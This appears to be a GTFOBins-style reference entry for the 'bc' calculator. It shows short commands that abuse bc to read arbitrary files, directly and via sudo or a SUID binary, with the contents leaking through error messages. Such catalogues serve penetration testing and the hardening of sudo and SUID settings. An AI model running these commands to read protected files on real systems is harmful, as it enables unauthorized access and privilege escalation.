---

description: The file content is actually parsed and appears as error messages, thus it might not be suitable to read arbitray binary files.
functions:
  file-read:
    - code: |
        LFILE=file_to_read
        bc -s $LFILE
        quit
  sudo:
    - code: |
        LFILE=file_to_read
        sudo bc -s $LFILE
        quit
  suid:
    - code: |
        LFILE=file_to_read
        ./bc -s $LFILE
        quit
---
